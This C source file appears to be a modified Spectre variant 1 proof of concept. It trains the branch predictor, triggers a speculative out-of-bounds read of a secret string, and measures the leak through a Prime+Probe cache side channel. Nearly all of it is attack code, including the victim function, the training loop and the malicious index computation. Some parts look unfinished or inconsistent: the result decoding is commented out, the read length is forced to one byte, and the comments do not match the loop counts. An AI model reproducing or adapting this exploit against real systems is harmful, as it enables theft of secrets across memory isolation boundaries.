#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif
#include <stdio.h>
#include <stdlib.h>
#include <cachesc.h>


// Pin process to a CPU. To reduce noise, this CPU can be isolated.
#define CPU_NUMBER 1
#define CACHE_HIT_THRESHOLD (120)  /* assume cache hit if time <= threshold */

#define TARGET_CACHE L1
#define MSRMTS_PER_SAMPLE L1_SETS
#define PRIME prime

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; 
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 64];
	}
}


void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	int sample_cnt = 1000;
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	// Preparation for prime+probe
    // Get a cache context object containing the dimensions of the attacked
    // cache.
    cache_ctx *ctx = get_cache_ctx(TARGET_CACHE);
    // Prepare the Prime+Probe data structure. For unprivileged L2 attacks,
    // this can take a while.
    cacheline *cache_ds = prepare_cache_ds(ctx);

    // Prepare an array to store the time measurements
    size_t res_size = sample_cnt * MSRMTS_PER_SAMPLE * sizeof(time_type);
    time_type *res  = (time_type *) malloc(res_size);
    assert(res);
    memset(res, 0, res_size);

    // Pin process to a CPU
    pin_to_cpu(CPU_NUMBER);

    uint32_t *curr_res      = res;
    cacheline *curr_head    = cache_ds;
    cacheline *next_head;

    prepare_measurement();


    /*
     * Make baseline measurements for normalisation (optional)
     */

    PRINT_LINE("Initial attacker preparation\n");
    PRINT_LINE("Number of samples: %d\n", sample_cnt);
    PRINT_LINE("Measurements per sample: %d\n", MSRMTS_PER_SAMPLE);

    /*
     * Start attacking for "sample_cnt" rounds
     */
    // print_banner("Start cache attack(s)");

    prepare_measurement();
    #ifdef NORMALIZE
    for (i = 0; i < sample_cnt; ++i) {
        curr_head = PRIME(curr_head);
        next_head = probe(TARGET_CACHE, curr_head);

        get_msrmts_for_all_set(curr_head, curr_res);
        curr_head = next_head;
        curr_res += MSRMTS_PER_SAMPLE;
    }

    PRINT_LINE("Output cache set access baseline data\n");
    print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);

    // reset changes
    memset(res, 0, res_size);
    curr_res    = res;
    curr_head   = cache_ds;
    #endif

	for (tries = sample_cnt; tries > 0; tries--) {

		/* Flush array2[256*(0..255)] from cache */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = 1;
	fprintf(stderr,"The target is: %d\n",((long long)(&array2[array1[training_x]*64])>>6)&0b111111);
        curr_head = PRIME(curr_head);
		for (j = 3; j >= 0; j--) {
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			// printf("[log] %ld %ld\n",x,malicious_x);
			/* Call the victim! */
			victim_function(x);
		}

        next_head = probe(TARGET_CACHE, curr_head);

        get_msrmts_for_all_set(curr_head, curr_res);
        curr_head = next_head;
        curr_res += MSRMTS_PER_SAMPLE;
	}
    PRINT_LINE("Output cache attack data\n");
    print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);
	// results[0] ^= junk;  /* use junk so code above won't get optimized out*/
	// value[0] = (uint8_t)j;
	// score[0] = results[j];
	// value[1] = (uint8_t)k;
	// score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x=(size_t)(secret-(char*)array1);   /* default for malicious_x */
	int i, score[2], len=40;
	uint8_t value[2];

	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3) {
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1;  /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	len = 1;
	fprintf(stderr,"The target is: %p\n",&array2[array1[malicious_x]*64]);
	fprintf(stderr,"The target is: %d\n",((int)(&array2[array1[malicious_x]*64])>>6)&0b111111);
	while (--len >= 0) {
		// printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		// printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		// printf("0x%02X='%c' score=%d    ", value[0], 
		// 		(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		// if (score[1] > 0)
		// 	printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		// printf("\n");
	}
	return (0);
}
